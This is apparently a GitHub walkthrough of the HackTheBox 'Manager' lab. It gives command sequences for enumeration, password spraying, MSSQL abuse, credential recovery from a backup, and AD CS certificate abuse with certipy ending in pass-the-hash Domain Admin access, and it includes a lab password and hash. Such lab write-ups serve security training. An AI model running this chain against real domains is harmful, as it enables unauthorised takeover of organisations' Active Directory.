# Manager - HTB Walkthrough

[![Hack The Box](https://img.shields.io/badge/HackTheBox-Manager-orange?logo=hackthebox)](https://app.hackthebox.com/machines/642)
[![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Medium-orange)](https://github.com/subhash00/HackTheBox/)
[![Platform: Windows](https://img.shields.io/badge/Platform-Windows-blue)](https://github.com/subhash00/HackTheBox/)
[![Topic: Active Directory](https://img.shields.io/badge/Topic-Active%20Directory-yellowgreen)](https://en.wikipedia.org/wiki/Active_Directory)

---

## Overview

Manager is a medium-difficulty Windows Active Directory lab hosted on HackTheBox, focused on enumeration, SQL Server exploitation, credential discovery from backups, and privilege escalation via Active Directory Certificate Services (AD CS). The lab highlights practical offensive techniques: port/service enumeration, password spraying, lateral movement, and AD CS ticket abuse for Domain Admin compromise.

---

## Table of Contents

- [Enumeration](#enumeration)
- [Initial Foothold](#initial-foothold)
- [Exploiting MSSQL](#exploiting-mssql)
- [Backup Extraction & Credential Hunt](#backup-extraction--credential-hunt)
- [WinRM Shell & User Flag](#winrm-shell--user-flag)
- [AD CS Abuse & Privilege Escalation](#ad-cs-abuse--privilege-escalation)
- [Root Flag](#root-flag)
- [Stepwise PoC](#stepwise-poc)
- [Tools Used](#tools-used)
- [Technologies Used](#technologies-used)

---

## Enumeration
```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.219.214 | grep '^[0-9]' | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.219.214
echo "10.129.219.214 manager.htb dc01.manager.htb" | sudo tee -a /etc/hosts
smbclient -L 10.129.219.214 -N
impacket-lookupsid anonymous@manager.htb -no-pass
```
- Full port scan, hostname mapping.
- Enumerate SMB shares anonymously.
- Perform RID cycling to extract valid usernames.

---

## Initial Foothold

```
netexec smb 10.129.219.214 -u user.txt -p user.txt --no-bruteforce
```
- Spray through users against SMB login for valid credentials.

---

## Exploiting MSSQL

```
impacket-mssqlclient manager/operator:operator@manager.htb -windows-auth
xp_dirtree
```
- Log into SQL server using discovered creds.
- Abuse `xp_dirtree` for filesystem read.

---

## Backup Extraction & Credential Hunt

```


wget http://10.10.11.236/website-backup-27-07-23-old.zip
unzip website-backup-27-07-23-old.zip -d website-backup-27-07-23-old
cd website-backup-27-07-23-old
ls -la
nano .old-conf.xml
```
- Download and extract website backup.
- Uncover hidden `.xml` config containing plaintext credentials.

---

## WinRM Shell & User Flag
```
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
whoami
type C:\Users\raven\Desktop\user.txt
```
- Gain interactive WinRM shell with found creds.
- Confirm user and retrieve user flag.

---

## AD CS Abuse & Privilege Escalation
```
certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -stdout -vulnerable
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -add-officer raven -debug
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -enable-template subca	
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -list-templates	
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb	
certipy ca -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -issue-request 20	
certipy req -u raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.219.214 -ca manager-dc01-ca -retrieve 20	
certipy auth -pfx administrator.pfx	
```
- Enumerated AD CS configuration and vulnerabilities.
- Added raven as certificate officer.
- Enabled subca template.
- Requested and retrieved administrator certificate.
  (Note: If received error "Got access denied trying to issue certificate" then just re-run the certipy command to add raven as officer)
- Authenticated as admin using certificate.

---

## Root Access & Flag
```
evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef
type C:\Users\Administrator\Desktop\root.txt
```

- Used administrator hash to get privileged WinRM access.
- Retrieved root flag.

---

## Stepwise PoC

<details>
<summary>💻<strong>(click to expand)</strong> </summary>
<img width="1549" height="824" alt="23" src="https://github.com/user-attachments/assets/c2c2ef32-9a3f-40c8-a8e2-5dfecd577e48" />
<img width="1549" height="806" alt="22" src="https://github.com/user-attachments/assets/fb8a02f6-fc81-4ebe-b750-18aa3ddce914" />
<img width="1075" height="102" alt="21" src="https://github.com/user-attachments/assets/2f632f1c-32b9-4378-8056-30892532cfb0" />
<img width="1059" height="387" alt="20" src="https://github.com/user-attachments/assets/13ec77e3-1e2c-4624-94e9-2c403726e55e" />
<img width="1184" height="754" alt="19" src="https://github.com/user-attachments/assets/6ca8a2e9-2d6c-486b-9249-7a971ca8a55c" />
<img width="1692" height="660" alt="18" src="https://github.com/user-attachments/assets/c3152018-150c-4a52-9e85-b26066c8e1a1" />
<img width="1309" height="325" alt="17" src="https://github.com/user-attachments/assets/8c10252c-e466-4066-8be5-5049e4757543" />
<img width="1194" height="404" alt="16" src="https://github.com/user-attachments/assets/f0417121-1d33-4783-9838-2befa6e34959" />
<img width="1906" height="186" alt="15" src="https://github.com/user-attachments/assets/ee2aedac-41c5-43de-bece-4b03b8e2c534" />
<img width="592" height="772" alt="14" src="https://github.com/user-attachments/assets/4a953f84-deb4-4fcf-a7af-1be0b9aa67c0" />
<img width="798" height="670" alt="13" src="https://github.com/user-attachments/assets/9bbb9c72-c884-484e-8114-b7dd0e4b9e4b" />
<img width="974" height="392" alt="12" src="https://github.com/user-attachments/assets/c284ee4c-cc45-4653-b316-bdb991008202" />
<img width="968" height="516" alt="11" src="https://github.com/user-attachments/assets/6aa29bcc-f4c1-4bbe-90b1-f7707bc90b36" />
<img width="1219" height="614" alt="10" src="https://github.com/user-attachments/assets/7ff65330-1b20-410d-ab39-a5ad88e3938f" />
<img width="1635" height="411" alt="9" src="https://github.com/user-attachments/assets/75878153-0382-4ef0-bd9c-0a2b27fc48ef" />
<img width="1229" height="804" alt="8" src="https://github.com/user-attachments/assets/06002e6d-91ee-436f-a257-a30f785f877c" />
<img width="1074" height="744" alt="7" src="https://github.com/user-attachments/assets/2cc3b15d-bbbb-40b6-90f6-ea44a7b2f948" />
<img width="1656" height="443" alt="6" src="https://github.com/user-attachments/assets/60fb543a-bcf8-4844-ace5-6c3ef564c5f0" />
<img width="1538" height="487" alt="5" src="https://github.com/user-attachments/assets/9c84702f-2e75-4c92-9d43-b62066ca93a8" />
<img width="1873" height="538" alt="4" src="https://github.com/user-attachments/assets/3c60fdf0-52c5-4ddd-a27f-9e60eda818ef" />
<img width="1655" height="465" alt="3" src="https://github.com/user-attachments/assets/187e4f62-9488-4fa9-a5d8-0918c57ffd48" />
<img width="1521" height="626" alt="2" src="https://github.com/user-attachments/assets/20861512-c86f-4d96-9dcc-1655e3c89b75" />
<img width="1631" height="373" alt="1" src="https://github.com/user-attachments/assets/f4c5080b-58eb-4dd2-8eec-135a98d54744" />

</details>

---

## Tools Used

| Tool               | Description                                       |
|--------------------|-------------------------------------------------|
| nmap               | Network scanner for port and service discovery.|
| smbclient          | Enumeration of SMB shares.                       |
| impacket           | Toolkit for protocol interactions and enumeration.|
| netexec            | Password spraying and authentication automation.|
| evil-winrm         | Remote Windows shell via WinRM protocol.        |
| wget & unzip       | Download and extract files from web server.     |
| certipy            | AD CS enumeration and exploitation tool.        |

---

## Technologies Used

| Technology         | Description                                      |
|--------------------|------------------------------------------------|
| Windows Server     | Target OS hosting Active Directory services.   |
| Active Directory   | Centralized authentication and user/group mgmt.|
| MSSQL              | Database management system used in lab.        |
| SMB                | File sharing and enumeration channel.           |
| AD CS              | Certificate Services, abused here for escalation|
| WinRM              | Windows Remote Management for shell access.     |

---

